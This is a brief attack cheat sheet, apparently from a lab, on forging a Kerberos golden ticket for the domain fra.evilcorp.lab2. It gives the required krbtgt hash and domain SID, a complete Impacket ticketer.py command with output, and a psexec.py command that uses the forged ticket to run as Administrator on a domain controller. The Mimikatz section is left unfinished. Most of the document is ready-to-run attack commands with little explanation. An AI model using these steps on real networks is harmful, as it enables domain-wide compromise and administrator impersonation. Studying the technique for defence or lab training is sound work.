# Create and Use a Golden Ticket

You will need:

* The FQDN of the domain: `fra.evilcorp.lab2`
* The SID of the domain: `S-1-5-21-2894840767-735700-3593130334`
* The NTLM hash of the `krbtgt` account: `25619bab39a137291b536a7bf42c6780`
* The `samAccountName` of the user to impersonate (preferably a domain admin): `Administrator`

## With Impacket from Linux

Create the ticket.
`ticketer.py -nthash 25619bab39a137291b536a7bf42c6780 -domain-sid S-1-5-21-2894840767-735700-3593130334 -domain fra.evilcorp.lab2 Administrator`

``` text
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for fra.evilcorp.lab2/Administrator
[*]   PAC_LOGON_INFO
[*]   PAC_CLIENT_INFO_TYPE
[*]   EncTicketPart
[*]   EncAsRepPart
[*] Signing/Encrypting final ticket
[*]   PAC_SERVER_CHECKSUM
[*]   PAC_PRIVSVR_CHECKSUM
[*]   EncTicketPart
[*]   EncASRepPart
[*] Saving ticket in Administrator.ccache
```

That will create a file `Administrator.ccache` in the current directory.

Export a variable of the file:
`export KRB5CCNAME=/home/user/Administrator.ccache`

Use it:
`psexec.py -dc-ip 192.168.58.11 -target-ip 192.168.58.11 -no-pass -k fra.evilcorp.lab2/Administrator@192.168.58.11`

## With Mimikatz from Windows

Open Mimikatz and fire the commands:

Create a golden ticket and save it to a file in current directory:

**To be completed.**
